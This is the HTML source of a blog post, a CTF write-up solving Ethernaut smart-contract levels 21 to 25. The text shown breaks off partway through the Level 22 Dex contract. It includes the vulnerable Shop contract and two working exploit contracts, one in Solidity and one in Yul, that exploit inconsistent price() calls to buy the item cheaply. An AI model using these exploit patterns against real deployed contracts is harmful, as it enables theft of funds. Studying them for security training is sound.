@@ -1,0 +1,1027 @@
+
+<!DOCTYPE html>
+<html lang="en" data-figures="" class="page" data-mode="dim">
+  <head>
+<title>Solving Ethernaut - Part 5 - Levels 21 to 25 | tqts.ar</title>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-HFZFM2N29W"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+  gtag('config', 'G-HFZFM2N29W');
+</script>
+
+<meta property="og:locale" content="en" />
+
+<meta property="og:type" content="article">
+<meta name="description" content="Fifth (and last?) part of the solutions to Ethernaut. The challenges in this part are mostly vulnerabilities on more complex contracts, that mimic real …">
+<meta name="twitter:card" content="summary" />
+<meta name="twitter:creator" content="">
+<meta name="twitter:title" content="Solving Ethernaut - Part 5 - Levels 21 to 25" />
+<meta property="og:url" content="https://tqts.ar/post/ethernaut-5/" />
+<meta property="og:title" content="Solving Ethernaut - Part 5 - Levels 21 to 25" />
+<meta property="og:description" content="Fifth (and last?) part of the solutions to Ethernaut. The challenges in this part are mostly vulnerabilities on more complex contracts, that mimic real …" />
+<meta property="og:image" content="https://tqts.ar/images/thumbnail.png" />
+
+<link rel="apple-touch-icon" sizes="180x180" href="https://tqts.ar/icons/apple-touch-icon.png">
+<link rel="icon" type="image/png" sizes="32x32" href="https://tqts.ar/icons/favicon-32x32.png">
+<link rel="manifest" href="https://tqts.ar/icons/site.webmanifest">
+
+<link rel="canonical" href="https://tqts.ar/post/ethernaut-5/">
+
+    
+
+    
+    
+    <link rel="preload" href="https://tqts.ar/css/styles.75d793ff9f1e090e07d6a6cf44af247593771bca925b6dc314709dc3c182c3174fd9691c42ea2128f9e95746557fc6918b2f7990cfcf6d34c56a7806d9b6a2da.css" integrity = "sha512-ddeT/58eCQ4H1qbPRK8kdZN3G8qSW23DFHCdw8GCwxdP2WkcQuohKPnpV0ZVf8aRiy95kM/PbTTFangG2bai2g==" as="style" crossorigin="anonymous">
+    <link rel="preload" href="https://tqts.ar/js/bundle.min.061d04727b51b0a8fafe2f15b9370a961f33306e7af52abd00d69c906f5d825f1599306159d7756d7d2b4f359767a170625ae541d1f37d05c1daa4d5c7feec25.js" as="script" integrity=
+    "sha512-Bh0EcntRsKj6/i8VuTcKlh8zMG569Sq9ANackG9dgl8VmTBhWdd1bX0rTzWXZ6FwYlrlQdHzfQXB2qTVx/7sJQ==" crossorigin="anonymous">
+
+    
+    <link rel="stylesheet" type="text/css" href="https://tqts.ar/css/styles.75d793ff9f1e090e07d6a6cf44af247593771bca925b6dc314709dc3c182c3174fd9691c42ea2128f9e95746557fc6918b2f7990cfcf6d34c56a7806d9b6a2da.css" integrity="sha512-ddeT/58eCQ4H1qbPRK8kdZN3G8qSW23DFHCdw8GCwxdP2WkcQuohKPnpV0ZVf8aRiy95kM/PbTTFangG2bai2g==" crossorigin="anonymous">
+    
+  </head>
+  
+  
+  
+    
+  
+  <body data-code="25" data-lines="true" id="documentTop">
+
+<script type="text/javascript" async
+  src="https://cdn.jsdelivr.net/npm/mathjax@2.7.4/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
+</script>
+<script type="text/x-mathjax-config">
+MathJax.Hub.Config({
+  tex2jax: {
+    inlineMath: [['$','$'], ['\\(','\\)']],
+    displayMath: [['$$','$$'], ['\[','\]']],
+    processEscapes: true,
+    processEnvironments: true,
+    skipTags: ['script', 'noscript', 'style', 'textarea', 'pre','code'],
+    TeX: { equationNumbers: { autoNumber: "AMS" },
+         extensions: ["AMSmath.js", "AMSsymbols.js"] }
+  }
+});
+</script>
+<header class="nav_header" >
+  <nav class="nav"><a href='https://tqts.ar/' class="nav_brand nav_item" title="tqts.ar">
+  <img src="https://tqts.ar/logos/logo.png" class="logo" alt="tqts.ar">
+  <div class="nav_close">
+    <div><svg class="icon">
+  <use xlink:href="#open-menu"></use>
+</svg><svg class="icon">
+  <use xlink:href="#closeme"></use>
+</svg></div>
+  </div>
+</a>
+
+    <div class='nav_body nav_body_left'>
+      
+      
+      
+        
+
+  <div class="nav_parent">
+    <a href="https://tqts.ar/" class="nav_item" title="Home">Home </a>
+  </div>
+  <div class="nav_parent">
+    <a href="https://tqts.ar/posts/" class="nav_item" title="Archives">Archives </a>
+  </div>
+  <div class="nav_parent">
+    <a href="https://tqts.ar/about/" class="nav_item" title="About">About </a>
+  </div>
+      
+<div class='follow'>
+  <a href="https://github.com/tqtsar">
+    <svg class="icon">
+  <use xlink:href="#github"></use>
+</svg>
+  </a>
+    
+  <a href="https://tqts.ar/index.xml">
+    <svg class="icon">
+  <use xlink:href="#rss"></use>
+</svg>
+  </a>
+<div class="color_mode">
+  <input type="checkbox" class="color_choice" id="mode">
+</div>
+
+</div>
+
+    </div>
+  </nav>
+</header>
+
+    <main>
+  
+<div class="grid-inverse wrap content">
+  <article class="post_content">
+    <h1 class="post_title">Solving Ethernaut - Part 5 - Levels 21 to 25</h1>
+  <div class="post_meta">
+    <span><svg class="icon">
+  <use xlink:href="#calendar"></use>
+</svg></span>
+    <span class="post_date">
+      Nov 15, 2021</span>
+    <span class="post_time"> · 21 min read</span><span>&nbsp;· <a href='https://tqts.ar/tags/remix' title="Remix" class="post_tag button button_translucent">Remix
+        </a><a href='https://tqts.ar/tags/solidity' title="Solidity" class="post_tag button button_translucent">Solidity
+        </a>
+    </span>
+    <span class="page_only">&nbsp;·
+  <div class="post_share">
+    Share on:
+    <a href="https://twitter.com/intent/tweet?text=Solving%20Ethernaut%20-%20Part%205%20-%20Levels%2021%20to%2025&url=https%3a%2f%2ftqts.ar%2fpost%2fethernaut-5%2f&tw_p=tweetbutton" class="twitter" title="Share on Twitter" target="_blank" rel="nofollow">
+      <svg class="icon">
+  <use xlink:href="#twitter"></use>
+</svg>
+    </a>
+    <a href="https://www.facebook.com/sharer.php?u=https%3a%2f%2ftqts.ar%2fpost%2fethernaut-5%2f&t=Solving%20Ethernaut%20-%20Part%205%20-%20Levels%2021%20to%2025" class="facebook" title="Share on Facebook" target="_blank" rel="nofollow">
+      <svg class="icon">
+  <use xlink:href="#facebook"></use>
+</svg>
+    </a>
+    <a href="#linkedinshare" id = "linkedinshare" class="linkedin" title="Share on LinkedIn" rel="nofollow">
+      <svg class="icon">
+  <use xlink:href="#linkedin"></use>
+</svg>
+    </a>
+    <a href="https://tqts.ar/post/ethernaut-5/" title="Copy Link" class="link link_yank">
+      <svg class="icon">
+  <use xlink:href="#copy"></use>
+</svg>
+    </a>
+  </div>
+  </span>
+  </div>
+
+
+
+
+    
+    <div class="post_toc">
+      <h2>Overview</h2>
+      <nav id="TableOfContents">
+  <ul>
+    <li><a href="#level-21-shop">Level 21: Shop</a>
+      <ul>
+        <li><a href="#contract-analysis">Contract analysis</a></li>
+        <li><a href="#vulnerability--attack-vector">Vulnerability / Attack vector</a></li>
+        <li><a href="#solution">Solution</a></li>
+        <li><a href="#conclusions">Conclusions</a></li>
+      </ul>
+    </li>
+    <li><a href="#level-22-dex">Level 22: Dex</a>
+      <ul>
+        <li><a href="#contract-analysis-1">Contract analysis</a></li>
+        <li><a href="#vulnerability--attack-vector-1">Vulnerability / Attack vector</a></li>
+        <li><a href="#solution-1">Solution</a></li>
+        <li><a href="#conclusions-1">Conclusions</a></li>
+      </ul>
+    </li>
+    <li><a href="#level-23-dex-two">Level 23: Dex Two</a>
+      <ul>
+        <li><a href="#contract-analysis-2">Contract analysis</a></li>
+        <li><a href="#vulnerability--attack-vector-2">Vulnerability / Attack vector</a></li>
+        <li><a href="#solution-2">Solution</a></li>
+        <li><a href="#conclusions-2">Conclusions</a></li>
+      </ul>
+    </li>
+    <li><a href="#level-24-puzzle-wallet">Level 24: Puzzle wallet</a>
+      <ul>
+        <li><a href="#contract-analysis-3">Contract analysis</a></li>
+        <li><a href="#vulnerability--attack-vector-3">Vulnerability / Attack vector</a></li>
+        <li><a href="#solution-3">Solution</a></li>
+        <li><a href="#conclusions-3">Conclusions</a></li>
+      </ul>
+    </li>
+    <li><a href="#level-25-motorbike">Level 25: Motorbike</a>
+      <ul>
+        <li><a href="#contract-analysis-4">Contract analysis</a></li>
+        <li><a href="#vulnerability--attack-vector-4">Vulnerability / Attack vector</a></li>
+        <li><a href="#solution-4">Solution</a></li>
+        <li><a href="#conclusions-4">Conclusions</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+    </div>
+    
+    <div class="post_body"><p>Fifth (and last?) part of the solutions to Ethernaut. The challenges in this part are mostly vulnerabilities on more complex contracts, that mimic real exploits.</p>
+<style type="text/css">.notice{padding:18px;line-height:24px;margin-bottom:24px;border-radius:4px;color:#444;background:#e7f2fa}.notice p:last-child{margin-bottom:0}.notice-title{margin:-18px -18px 12px;padding:4px 18px;border-radius:4px 4px 0 0;font-weight:700;color:#fff;background:#6ab0de}.notice.warning .notice-title{background:rgba(217,83,79,.9)}.notice.warning{background:#fae2e2}.notice.info .notice-title{background:#f0b37e}.notice.info{background:#fff2db}.notice.note .notice-title{background:#6ab0de}.notice.note{background:#e7f2fA}.notice.tip .notice-title{background:rgba(92,184,92,.8)}.notice.tip{background:#e6f9e6}.icon-notice{display:inline-flex;align-self:center;margin-right:8px}.icon-notice img,.icon-notice svg{height:1em;width:1em;fill:currentColor}.icon-notice img,.icon-notice.baseline svg{top:0.125em;position:relative}</style>
+<div><svg width="0" height="0" display="none" xmlns="http://www.w3.org/2000/svg"><symbol id="tip-notice" viewBox="0 0 512 512" preserveAspectRatio="xMidYMid meet"><path d="M504 256c0 136.967-111.033 248-248 248S8 392.967 8 256 119.033 8 256 8s248 111.033 248 248zM227.314 387.314l184-184c6.248-6.248 6.248-16.379 0-22.627l-22.627-22.627c-6.248-6.249-16.379-6.249-22.628 0L216 308.118l-70.059-70.059c-6.248-6.248-16.379-6.248-22.628 0l-22.627 22.627c-6.248 6.248-6.248 16.379 0 22.627l104 104c6.249 6.249 16.379 6.249 22.628.001z"/></symbol><symbol id="note-notice" viewBox="0 0 512 512" preserveAspectRatio="xMidYMid meet"><path d="M504 256c0 136.997-111.043 248-248 248S8 392.997 8 256C8 119.083 119.043 8 256 8s248 111.083 248 248zm-248 50c-25.405 0-46 20.595-46 46s20.595 46 46 46 46-20.595 46-46-20.595-46-46-46zm-43.673-165.346l7.418 136c.347 6.364 5.609 11.346 11.982 11.346h48.546c6.373 0 11.635-4.982 11.982-11.346l7.418-136c.375-6.874-5.098-12.654-11.982-12.654h-63.383c-6.884 0-12.356 5.78-11.981 12.654z"/></symbol><symbol id="warning-notice" viewBox="0 0 576 512" preserveAspectRatio="xMidYMid meet"><path d="M569.517 440.013C587.975 472.007 564.806 512 527.94 512H48.054c-36.937 0-59.999-40.055-41.577-71.987L246.423 23.985c18.467-32.009 64.72-31.951 83.154 0l239.94 416.028zM288 354c-25.405 0-46 20.595-46 46s20.595 46 46 46 46-20.595 46-46-20.595-46-46-46zm-43.673-165.346l7.418 136c.347 6.364 5.609 11.346 11.982 11.346h48.546c6.373 0 11.635-4.982 11.982-11.346l7.418-136c.375-6.874-5.098-12.654-11.982-12.654h-63.383c-6.884 0-12.356 5.78-11.981 12.654z"/></symbol><symbol id="info-notice" viewBox="0 0 512 512" preserveAspectRatio="xMidYMid meet"><path d="M256 8C119.043 8 8 119.083 8 256c0 136.997 111.043 248 248 248s248-111.003 248-248C504 119.083 392.957 8 256 8zm0 110c23.196 0 42 18.804 42 42s-18.804 42-42 42-42-18.804-42-42 18.804-42 42-42zm56 254c0 6.627-5.373 12-12 12h-88c-6.627 0-12-5.373-12-12v-24c0-6.627 5.373-12 12-12h12v-64h-12c-6.627 0-12-5.373-12-12v-24c0-6.627 5.373-12 12-12h64c6.627 0 12 5.373 12 12v100h12c6.627 0 12 5.373 12 12v24z"/></symbol></svg></div><div class="notice info" >
+<p class="first notice-title"><span class="icon-notice baseline"><svg><use href="#info-notice"></use></svg></span>Info</p><p>All my solutions to Ethernaut were coded some time ago, however, I had a bit more experience with Solidity than when I solved CaptureTheEther. The code still won't win any style or correctness competition, but does its job.</p>
+<p>It's possible to see an improvement on the quality of my code. The contracts I used were not modified nor prettified for publishing, so I'm quite proud of my progress. Still there's a lot of room for even more improvements. Never stop learning and getting better at something.</p>
+<p>The complete code for these solutions is at my <a href="https://github.com/tqtsar/ethernaut-solutions">Ethernaut-solutions github repo</a>.</p></div>
+
+<hr>
+<h2 id="level-21-shop">Level 21: Shop</h2>
+<hr>
+<p>A contract that sets up a shop, asking a price for an item. The goal is to buy the item with a discounted price.</p>
+<h3 id="contract-analysis">Contract analysis</h3>
+<p>This is an improved version of <a href="../ethernaut-3/#level-11-elevator">Level 11 - Elevator</a>. The difference is that the called function is now <code>view</code>, which means that it can't modify storage.</p>
+<p>The <code>Shop</code> contract asks the price the <code>Buyer</code> is willing to pay for the item, by calling its <code>price()</code> function, with a <code>STATICCALL</code> due to the <code>view</code> modifier. If the price is higher than the selling price, the item is sold.</p>
+<p>The call to <code>price()</code> has a hardcoded gas limit of 3300 units.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="ln"> 1</span><span class="c1">// SPDX-License-Identifier: MIT
+</span><span class="ln"> 2</span><span class="c1"></span><span class="k">pragma solidity</span> <span class="o">^</span><span class="mi">0</span><span class="p">.</span><span class="mi">6</span><span class="p">.</span><span class="mi">0</span><span class="p">;</span>
+<span class="ln"> 3</span>
+<span class="ln"> 4</span><span class="kd">interface</span> <span class="nc">Buyer</span> <span class="p">{</span>
+<span class="ln"> 5</span>  <span class="kd">function</span> <span class="nf">price</span><span class="p">()</span> <span class="k">external</span> <span class="k">view</span> <span class="k">returns</span> <span class="p">(</span><span class="kt">uint</span><span class="p">);</span>
+<span class="ln"> 6</span><span class="p">}</span>
+<span class="ln"> 7</span>
+<span class="ln"> 8</span><span class="kd">contract</span> <span class="nc">Shop</span> <span class="p">{</span>
+<span class="ln"> 9</span>  <span class="kt">uint</span> <span class="k">public</span> <span class="n">price</span> <span class="o">=</span> <span class="mi">100</span><span class="p">;</span>
+<span class="ln">10</span>  <span class="kt">bool</span> <span class="k">public</span> <span class="n">isSold</span><span class="p">;</span>
+<span class="ln">11</span>
+<span class="ln">12</span>  <span class="kd">function</span> <span class="nf">buy</span><span class="p">()</span> <span class="k">public</span> <span class="p">{</span>
+<span class="ln">13</span>    <span class="n">Buyer</span> <span class="n">_buyer</span> <span class="o">=</span> <span class="n">Buyer</span><span class="p">(</span><span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">);</span>
+<span class="ln">14</span>
+<span class="ln">15</span>    <span class="k">if</span> <span class="p">(</span><span class="n">_buyer</span><span class="p">.</span><span class="n">price</span><span class="p">{</span><span class="nb">gas</span><span class="o">:</span><span class="mi">3300</span><span class="p">}()</span> <span class="o">&gt;=</span> <span class="n">price</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="n">isSold</span><span class="p">)</span> <span class="p">{</span>
+<span class="ln">16</span>      <span class="n">isSold</span> <span class="o">=</span> <span class="kc">true</span><span class="p">;</span>
+<span class="ln">17</span>      <span class="n">price</span> <span class="o">=</span> <span class="n">_buyer</span><span class="p">.</span><span class="n">price</span><span class="p">{</span><span class="nb">gas</span><span class="o">:</span><span class="mi">3300</span><span class="p">}();</span>
+<span class="ln">18</span>    <span class="p">}</span>
+<span class="ln">19</span>  <span class="p">}</span>
+<span class="ln">20</span><span class="p">}</span>
+</code></pre></div><h3 id="vulnerability--attack-vector">Vulnerability / Attack vector</h3>
+<p>There are two calls to <code>price()</code> of the <code>Buyer</code>. The caller assumes this function will return always the same, but there's a chance that it doesn't.</p>
+<p>Even if the <code>Buyer::price()</code> call can't modify its own storage, there is a change in the <code>bool isSold</code> flag between both calls, and that flag is <code>public</code>, so its value can be seen from other contracts.</p>
+<h3 id="solution">Solution</h3>
+<p>From the called function's perspective, there's no way to tell apart the first and second call. It can't modify its own storage like the <a href="../ethernaut-3/#level-11-elevator#solution">Level 11 solution</a>, so it can't keep track of the number of times it has been called.</p>
+<p>As said above, the difference between the first and second calls to <code>price()</code>, is that (if the first call meets the stated conditions) prior to the second call, the value of <code>bool isSold</code> changes. It is a public variable, so the compiler generates a getter function (automatically marked as view) that returns the value. A <code>view</code> function can call other <code>view</code> functions via <code>STATICCALL</code>, this was the solution. Or the first attempt at a solution, at least.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="ln"> 1</span><span class="kd">contract</span> <span class="nc">ShopAttack</span> <span class="p">{</span>
+<span class="ln"> 2</span>    <span class="n">Shop</span> <span class="n">target</span><span class="p">;</span>
+<span class="ln"> 3</span>    
+<span class="ln"> 4</span>    <span class="kd">constructor</span><span class="p">(</span><span class="kt">address</span> <span class="n">_target</span><span class="p">)</span> <span class="k">public</span> <span class="p">{</span>
+<span class="ln"> 5</span>        <span class="n">target</span> <span class="o">=</span> <span class="n">Shop</span><span class="p">(</span><span class="n">_target</span><span class="p">);</span>
+<span class="ln"> 6</span>    <span class="p">}</span>
+<span class="ln"> 7</span>    
+<span class="ln"> 8</span>    <span class="kd">function</span> <span class="nf">price</span><span class="p">()</span> <span class="k">external</span> <span class="k">view</span> <span class="k">returns</span> <span class="p">(</span><span class="kt">uint</span><span class="p">)</span> <span class="p">{</span>
+<span class="ln"> 9</span>        <span class="k">if</span><span class="p">(</span><span class="n">target</span><span class="p">.</span><span class="n">isSold</span><span class="p">())</span> <span class="p">{</span>
+<span class="ln">10</span>            <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
+<span class="ln">11</span>        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+<span class="ln">12</span>            <span class="k">return</span> <span class="mi">101</span><span class="p">;</span>
+<span class="ln">13</span>        <span class="p">}</span>
+<span class="ln">14</span>    <span class="p">}</span>
+<span class="ln">15</span>    
+<span class="ln">16</span>    <span class="kd">function</span> <span class="nf">buy</span><span class="p">()</span> <span class="k">public</span> <span class="p">{</span>
+<span class="ln">17</span>        <span class="n">target</span><span class="p">.</span><span class="n">buy</span><span class="p">();</span>
+<span class="ln">18</span>    <span class="p">}</span>
+<span class="ln">19</span><span class="p">}</span>
+</code></pre></div><p>Deploying both the <code>Shop</code> and <code>ShopAttack</code> contracts in a Remix VM, this solution worked as expected. However, it didn't work at the real level instance.</p>
+<p>I started looking for the problem at Etherscan's transaction receipt and internal transactions. There it was, the calls to <code>Buyer.price()</code> did not forward 3300 gas, but only 3000. The deployed contract was different from the one shown in the level's page. Still, there had to be a solution. After all, <a href="../ethernaut-4/#level-18-magicnumber">Level 18</a> was enlightening, and its lesson should be learned by now.</p>
+<p>Next approach, meet Yul again:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="ln"> 1</span><span class="kd">contract</span> <span class="nc">ShopAttack</span> <span class="p">{</span>
+<span class="ln"> 2</span>    <span class="n">Shop</span> <span class="n">target</span><span class="p">;</span>
+<span class="ln"> 3</span>    
+<span class="ln"> 4</span>    <span class="kd">constructor</span><span class="p">(</span><span class="kt">address</span> <span class="n">_target</span><span class="p">)</span> <span class="k">public</span> <span class="p">{</span>
+<span class="ln"> 5</span>        <span class="n">target</span> <span class="o">=</span> <span class="n">Shop</span><span class="p">(</span><span class="n">_target</span><span class="p">);</span>
+<span class="ln"> 6</span>    <span class="p">}</span>
+<span class="ln"> 7</span>    
+<span class="ln"> 8</span>    <span class="kd">function</span> <span class="nf">price</span><span class="p">()</span> <span class="k">external</span> <span class="k">view</span> <span class="k">returns</span> <span class="p">(</span><span class="kt">uint</span><span class="p">)</span> <span class="p">{</span>
+<span class="ln"> 9</span>        
+<span class="ln">10</span>        <span class="k">assembly</span> <span class="p">{</span>
+<span class="ln">11</span>	          <span class="c1">// function signature as parameter
+</span><span class="ln">12</span><span class="c1"></span>            <span class="nf">mstore</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mh">0xe852e74100000000000000000000000000000000000000000000000000000000</span><span class="p">)</span>
+<span class="ln">13</span>            <span class="nf">pop</span><span class="p">(</span><span class="nf">staticcall</span><span class="p">(</span><span class="nf">gas</span><span class="p">(),</span> <span class="nf">sload</span><span class="p">(</span><span class="mi">0</span><span class="p">),</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">32</span><span class="p">,</span> <span class="mi">32</span><span class="p">,</span> <span class="mi">32</span><span class="p">))</span> 
+<span class="ln">14</span>            
+<span class="ln">15</span>            <span class="ow">let</span> <span class="nv">r</span> <span class="o">:=</span> <span class="nf">mload</span><span class="p">(</span><span class="mi">32</span><span class="p">)</span>
+<span class="ln">16</span>            <span class="n">if</span> <span class="nf">iszero</span><span class="p">(</span><span class="n">r</span><span class="p">)</span> <span class="p">{</span>
+<span class="ln">17</span>                <span class="nf">mstore</span><span class="p">(</span><span class="mi">64</span><span class="p">,</span> <span class="mi">101</span><span class="p">)</span>
+<span class="ln">18</span>                <span class="nf">return</span><span class="p">(</span><span class="mi">64</span><span class="p">,</span> <span class="mi">32</span><span class="p">)</span>
+<span class="ln">19</span>            <span class="p">}</span>
+<span class="ln">20</span>            <span class="nf">mstore</span><span class="p">(</span><span class="mi">64</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span>
+<span class="ln">21</span>            <span class="nf">return</span><span class="p">(</span><span class="mi">64</span><span class="p">,</span> <span class="mi">32</span><span class="p">)</span>
+<span class="ln">22</span>        <span class="p">}</span>
+<span class="ln">23</span>    <span class="p">}</span>
+<span class="ln">24</span>    
+<span class="ln">25</span>    <span class="kd">function</span> <span class="nf">buy</span><span class="p">()</span> <span class="k">public</span> <span class="p">{</span>
+<span class="ln">26</span>        <span class="n">target</span><span class="p">.</span><span class="n">buy</span><span class="p">();</span>
+<span class="ln">27</span>    <span class="p">}</span>
+<span class="ln">28</span><span class="p">}</span>
+</code></pre></div><p>The <code>price()</code> function now implements a similar behaviour to the previous one, but this time in Yul, that apparently misses some checks and therefore wastes less gas.</p>
+<p>The <code>mstore</code> and <code>staticcall()</code> functions at lines 12-13 call the <code>Shop</code> contract's <code>isSold()</code> getter. If the return value is zero (or <code>false</code>), the function returns a higher value to pass the <code>if</code> condition of the caller. Otherwise, if <code>isSold</code> is <code>true</code>, return a price of <code>1</code> to buy it cheap.</p>
+<h3 id="conclusions">Conclusions</h3>
+<p>The obvious one: if something changes between calls to external functions, it can be used as a conditional for modifying behaviour. The problem would be easily solved by calling <code>price()</code> once and caching the result.</p>
+<p>I'm still not sure if the wrong gas value in the <code>price()</code> call was intentional or accidental. However, I think the challenge was worth it.</p>
+<hr>
+<h2 id="level-22-dex">Level 22: Dex</h2>
+<hr>
+<p>A simple decentralized exchange that allows swapping between two tokens. The goal is to empty at least one of the tokens from the contract.</p>
+<h3 id="contract-analysis-1">Contract analysis</h3>
+<p>There are two ERC20 tokens not shown in the level code, called <code>token1</code> and <code>token2</code>. The <code>Dex</code> instance has a starting balance of 100 of each token, and the player 10 of each token.</p>
+<p>The exchange implements the <code>add_liquidity(address, uint)</code> function to add liquidity of a token (a fancy way of saying <em>you can send tokens to the contract that you will never get back</em>), a <code>balanceOf(address, address)</code> function to check balances of the tokens, a <code>get_swap_price(address, address, uint)</code> function to calculate the amount of tokens that the player can get if a swap is made, and finally an <code>approve(address, uint)</code> function to allow an address to spend tokens on behalf of the <code>msg.sender</code>.</p>
+<p>The <code>swap()</code> function is the one that implements the logic to check the balances and perform the swap of tokens. The only possible swaps are the ones involving <code>token1</code> and <code>token2</code>.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="ln"> 1</span><span class="c1">// SPDX-License-Identifier: MIT
+</span><span class="ln"> 2</span><span class="c1"></span><span class="k">pragma solidity</span> <span class="o">^</span><span class="mi">0</span><span class="p">.</span><span class="mi">6</span><span class="p">.</span><span class="mi">0</span><span class="p">;</span>
+<span class="ln"> 3</span>
+<span class="ln"> 4</span><span class="kn">import</span> <span class="s">&#34;@openzeppelin/contracts/token/ERC20/IERC20.sol&#34;</span><span class="p">;</span>
+<span class="ln"> 5</span><span class="kn">import</span> <span class="s">&#34;@openzeppelin/contracts/token/ERC20/ERC20.sol&#34;</span><span class="p">;</span>
+<span class="ln"> 6</span><span class="kn">import</span> <span class="s">&#39;@openzeppelin/contracts/math/SafeMath.sol&#39;</span><span class="p">;</span>
+<span class="ln"> 7</span>
+<span class="ln"> 8</span><span class="kd">contract</span> <span class="nc">Dex</span>  <span class="p">{</span>
+<span class="ln"> 9</span>  <span class="kn">using</span> <span class="n">SafeMath</span> <span class="k">for</span> <span class="kt">uint</span><span class="p">;</span>
+<span class="ln">10</span>  <span class="kt">address</span> <span class="k">public</span> <span class="n">token1</span><span class="p">;</span>
+<span class="ln">11</span>  <span class="kt">address</span> <span class="k">public</span> <span class="n">token2</span><span class="p">;</span>
+<span class="ln">12</span>  <span class="kd">constructor</span><span class="p">(</span><span class="kt">address</span> <span class="n">_token1</span><span class="p">,</span> <span class="kt">address</span> <span class="n">_token2</span><span class="p">)</span> <span class="k">public</span> <span class="p">{</span>
+<span class="ln">13</span>    <span class="n">token1</span> <span class="o">=</span> <span class="n">_token1</span><span class="p">;</span>
+<span class="ln">14</span>    <span class="n">token2</span> <span class="o">=</span> <span class="n">_token2</span><span class="p">;</span>
+<span class="ln">15</span>  <span class="p">}</span>
+<span class="ln">16</span>
+<span class="ln">17</span>  <span class="kd">function</span> <span class="nf">swap</span><span class="p">(</span><span class="kt">address</span> <span class="k">from</span><span class="p">,</span> <span class="kt">address</span> <span class="n">to</span><span class="p">,</span> <span class="kt">uint</span> <span class="n">amount</span><span class="p">)</span> <span class="k">public</span> <span class="p">{</span>
+<span class="ln">18</span>    <span class="nb">require</span><span class="p">((</span><span class="k">from</span> <span class="o">==</span> <span class="n">token1</span> <span class="o">&amp;&amp;</span> <span class="n">to</span> <span class="o">==</span> <span class="n">token2</span><span class="p">)</span> <span class="o">||</span> <span class="p">(</span><span class="k">from</span> <span class="o">==</span> <span class="n">token2</span> <span class="o">&amp;&amp;</span> <span class="n">to</span> <span class="o">==</span> <span class="n">token1</span><span class="p">),</span> <span class="s">&#34;Invalid tokens&#34;</span><span class="p">);</span>
+<span class="ln">19</span>    <span class="nb">require</span><span class="p">(</span><span class="n">IERC20</span><span class="p">(</span><span class="k">from</span><span class="p">).</span><span class="n">balanceOf</span><span class="p">(</span><span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">)</span> <span class="o">&gt;=</span> <span class="n">amount</span><span class="p">,</span> <span class="s">&#34;Not enough to swap&#34;</span><span class="p">);</span>
+<span class="ln">20</span>    <span class="kt">uint</span> <span class="n">swap_amount</span> <span class="o">=</span> <span class="n">get_swap_price</span><span class="p">(</span><span class="k">from</span><span class="p">,</span> <span class="n">to</span><span class="p">,</span> <span class="n">amount</span><span class="p">);</span>
+<span class="ln">21</span>    <span class="n">IERC20</span><span class="p">(</span><span class="k">from</span><span class="p">).</span><span class="n">transferFrom</span><span class="p">(</span><span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">,</span> <span class="kt">address</span><span class="p">(</span><span class="nb">this</span><span class="p">),</span> <span class="n">amount</span><span class="p">);</span>
+<span class="ln">22</span>    <span class="n">IERC20</span><span class="p">(</span><span class="n">to</span><span class="p">).</span><span class="n">approve</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="nb">this</span><span class="p">),</span> <span class="n">swap_amount</span><span class="p">);</span>
+<span class="ln">23</span>    <span class="n">IERC20</span><span class="p">(</span><span class="n">to</span><span class="p">).</span><span class="n">transferFrom</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="nb">this</span><span class="p">),</span> <span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">,</span> <span class="n">swap_amount</span><span class="p">);</span>
+<span class="ln">24</span>  <span class="p">}</span>
+<span class="ln">25</span>
+<span class="ln">26</span>  <span class="kd">function</span> <span class="nf">add_liquidity</span><span class="p">(</span><span class="kt">address</span> <span class="n">token_address</span><span class="p">,</span> <span class="kt">uint</span> <span class="n">amount</span><span class="p">)</span> <span class="k">public</span><span class="p">{</span>
+<span class="ln">27</span>    <span class="n">IERC20</span><span class="p">(</span><span class="n">token_address</span><span class="p">).</span><span class="n">transferFrom</span><span class="p">(</span><span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">,</span> <span class="kt">address</span><span class="p">(</span><span class="nb">this</span><span class="p">),</span> <span class="n">amount</span><span class="p">);</span>
+<span class="ln">28</span>  <span class="p">}</span>
+<span class="ln">29</span>
+<span class="ln">30</span>  <span class="kd">function</span> <span class="nf">get_swap_price</span><span class="p">(</span><span class="kt">address</span> <span class="k">from</span><span class="p">,</span> <span class="kt">address</span> <span class="n">to</span><span class="p">,</span> <span class="kt">uint</span> <span class="n">amount</span><span class="p">)</span> <span class="k">public</span> <span class="k">view</span> <span class="k">returns</span><span class="p">(</span><span class="kt">uint</span><span class="p">){</span>
+<span class="ln">31</span>    <span class="k">return</span><span class="p">((</span><span class="n">amount</span> <span class="o">*</span> <span class="n">IERC20</span><span class="p">(</span><span class="n">to</span><span class="p">).</span><span class="n">balanceOf</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="nb">this</span><span class="p">)))</span><span class="o">/</span><span class="n">IERC20</span><span class="p">(</span><span class="k">from</span><span class="p">).</span><span class="n">balanceOf</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="nb">this</span><span class="p">)));</span>
+<span class="ln">32</span>  <span class="p">}</span>
+<span class="ln">33</span>
